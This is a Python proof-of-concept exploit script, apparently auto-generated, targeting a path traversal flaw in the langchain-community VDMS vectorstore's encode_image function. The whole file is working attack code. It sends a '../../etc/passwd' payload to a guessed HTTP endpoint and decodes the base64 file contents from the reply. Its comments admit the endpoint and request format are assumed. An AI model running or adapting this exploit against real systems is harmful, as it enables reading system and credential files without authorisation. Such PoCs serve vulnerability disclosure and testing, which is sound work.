#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-009
# Sink: encode_image
# Auto-generated — run with: python3 lfi_sanitization_normalization_applied_encode_image_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langchain-community-only.

Vulnerability: The `encode_image` function in VDMS vectorstore directly opens
a file path provided by the caller without validation. The `add_images` method
passes user-controlled `uris` to `encode_image`, allowing arbitrary file read
via path traversal.

This PoC demonstrates reading /etc/passwd by exploiting the vulnerable endpoint.
"""

import requests
import sys
import json
import base64

# Configuration - change these to match your target
TARGET_URL = "http://localhost:8000/api/v1/trigger"
# Benign payload - reads /etc/passwd (safe for demonstration)
PAYLOAD = "../../etc/passwd"

def exploit_lfi(target_url, payload):
    """
    Attempt to exploit the LFI vulnerability by sending a malicious URI.
    
    Args:
        target_url: The vulnerable endpoint URL
        payload: Path traversal payload (e.g., "../../etc/passwd")
    
    Returns:
        Response text if successful, None otherwise
    """
    print(f"[*] Targeting: {target_url}")
    print(f"[*] Payload: {payload}")
    
    # The vulnerable endpoint expects a JSON body with the URI
    # Based on the code, `add_images` receives `uris` as a list
    request_body = {
        "uris": [payload]
    }
    
    try:
        print("[*] Sending malicious request...")
        response = requests.post(
            target_url,
            json=request_body,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status: {response.status_code}")
        
        if response.status_code == 200:
            print("[+] Request succeeded! Checking response for file contents...")
            
            # The response should contain base64-encoded file contents
            # Try to parse as JSON first
            try:
                result = response.json()
                print(f"[*] Response JSON: {json.dumps(result, indent=2)}")
                
                # Look for base64-encoded data in the response
                # The encode_image function returns base64 of the file
                if isinstance(result, dict):
                    for key, value in result.items():
                        if isinstance(value, str) and len(value) > 50:
                            try:
                                decoded = base64.b64decode(value).decode('utf-8', errors='replace')
                                print(f"[+] Decoded content from key '{key}':")
                                print(decoded[:500])  # Show first 500 chars
                                return decoded
                            except:
                                pass
                elif isinstance(result, list):
                    for item in result:
                        if isinstance(item, str) and len(item) > 50:
                            try:
                                decoded = base64.b64decode(item).decode('utf-8', errors='replace')
                                print(f"[+] Decoded content:")
                                print(decoded[:500])
                                return decoded
                            except:
                                pass
            except:
                # Raw response - might be base64 directly
                if len(response.text) > 50:
                    try:
                        decoded = base64.b64decode(response.text).decode('utf-8', errors='replace')
                        print(f"[+] Decoded raw response:")
                        print(decoded[:500])
                        return decoded
                    except:
                        print(f"[*] Raw response (first 500 chars): {response.text[:500]}")
                        return response.text
        else:
            print(f"[-] Request failed with status {response.status_code}")
            print(f"[-] Response: {response.text[:500]}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("[-] Make sure the target server is running and accessible")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    
    return None

def main():
    """Main function with argument parsing."""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langchain-community-only VDMS vectorstore"
    )
    parser.add_argument(
        "-u", "--url",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "-p", "--payload",
        default=PAYLOAD,
        help="Path traversal payload (default: ../../etc/passwd)"
    )
    parser.add_argument(
        "--safe",
        action="store_true",
        help="Use a safe payload (reads /etc/hostname instead of /etc/passwd)"
    )
    
    args = parser.parse_args()
    
    # Use safe payload if requested
    payload = args.payload
    if args.safe:
        payload = "../../etc/hostname"
        print("[*] Using safe payload: /etc/hostname")
    
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only")
    print("=" * 60)
    print()
    
    result = exploit_lfi(args.url, payload)
    
    if result:
        print("\n[+] Exploit successful! File contents retrieved.")
        print("[*] Note: This demonstrates arbitrary file read capability.")
        print("[*] An attacker could read any file on the system.")
    else:
        print("\n[-] Exploit failed or could not extract file contents.")
        print("[*] Possible reasons:")
        print("  - Target URL is incorrect or server is not running")
        print("  - The endpoint expects different request format")
        print("  - Path traversal is blocked by some middleware")
        print("  - The file doesn't exist or is not readable")
    
    return 0 if result else 1

if __name__ == "__main__":
    sys.exit(main())
